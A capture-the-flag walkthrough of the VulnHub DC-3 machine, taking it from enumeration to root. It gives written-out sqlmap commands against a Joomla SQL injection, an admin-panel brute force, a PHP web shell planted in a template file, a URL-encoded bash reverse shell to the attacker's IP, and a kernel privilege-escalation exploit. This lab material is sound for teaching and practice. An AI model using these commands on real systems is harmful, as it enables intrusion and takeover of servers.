# DC-3

## 1.Enumeration

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:0f	(Unknown: locally administered)
192.168.56.100	08:00:27:5f:5e:41	PCS Systemtechnik GmbH
192.168.56.115	08:00:27:31:0f:a8	PCS Systemtechnik GmbH
```

The IP address is `192.168.56.115`, let's scan it.

```bash
root@kali: nmap -sC -sV -p80 -v -oN nmap.out 192.168.56.115

Nmap scan report for 192.168.56.115
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
MAC Address: 08:00:27:31:0F:A8 (Oracle VirtualBox virtual NIC)

```

The only open port is port 80, so we have to work on the web application:

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8d992b5c-3a5d-4d38-898d-917b0ca7228d)

visiting the site, Wappalyzer shows this is a `Joomla` cms, also cheking the target with Nikto shows afew interesting directories :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d70cfbff-32d9-4a05-b39c-3f9932602930)

so i visited the `/administrator` page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b467734b-1e5e-4c24-8038-4392ad61cca1)

this is actually a joomla CMS, let's find the version of it to see any exploit available

there is a tool called `joomscan` that does afew enumeration :

```bash
root@kali: joomscan --url http://192.168.56.115
```
![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9a056c02-4bd8-43a7-9f4f-4e1fa4ec87e3)

you can also check for the version by visiting the below urls, but it gives an approximate version :

```bash
curl http://192.168.56.115/administrator/manifests/files/joomla.xml | grep version
 curl http://192.168.56.115/language/en-GB/en-GB.xml | grep version
```

then in searchsploit i found afew exploits :

```text
Joomla! 3.7 - SQL Injection | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection | php/webapps/42033.txt
```

the first one `44227` did not work, but the second one guides through a valid SQLi bug, i used the command mentioned in the document :

```bash
root@kali: #sqlmap -u "http://192.168.56.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch
```

sqlmap found the database in use, `joomladb`, then i tried to dump the data out of it, but did not work since it showed an error after running the below command :

```bash
root@kali: sqlmap -u "http://192.168.56.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --T '#__users' --dump -p list[fullordering] --batch 
```
![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8b690314-3d8d-4f09-bfc2-6d0a66c713df)

there must be something with the naming of the table which starts by `#`, so i went to another path and tried to brute force the admin panel

i used metasploit `auxiliary/scanner/http/joomla_bruteforce_login` but my system crushed every time i used this module, so i used nmap instead

put admin in user.txt

```bash
root@kali: nmap -v -sV --script http-joomla-brute --script-args 'userdb=/root/ctf/dc-3/user.txt,passdb=/usr/share/wordlists/rockyou.txt,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.56.115
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/bc195964-9da2-4005-accf-d838e0a5e493)

yes, we found admin password, try to login to panel

after logging in we just need to upload our shell so do as follow :


1- Click on Templates on the bottom left under Configuration to pull up the templates menu.

2- Click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page.

3- F1inally, you can click on a page to pull up the page source. Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows:
system($_GET['cmd']);

4- Save & Close

5- curl -s http://192.168.56.115/templates/protostar/error.php/error.php?cmd=id


## 2.Gaining Shell

I just used a python reverse shell and url encoded it to get my shell :

```bash
curl -s http://192.168.56.115/templates/protostar/error.php/error.php?cmd=bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F192%2E168%2E56%2E102%2F4444%20%3C%261%27
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/76f3165c-205f-4cf1-936a-41e65fcb418e)


## Privilege Escalation

First we look at kernel version :

```bash
www-data@DC-3:/var/www/html/templates/protostar$ uname -a

Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```

```bash
www-data@DC-3:/var/www/html/templates/protostar$ cat /etc/os-release

NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
```

just searching for its exploit on internet i found [this](https://www.exploit-db.com/exploits/39772)

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f69a9114-4b49-4108-8694-87e90b59d33e)

just download the zip file and upload it on the target and do the instructions :

```bash
www-data@DC-3:~/tmp/ebpf_mapfd_doubleput$ ./compile.sh
www-data@DC-3:~/tmp/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

cd /root

cat the-flag.txt

__        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
```

This is how you can get root on the system.










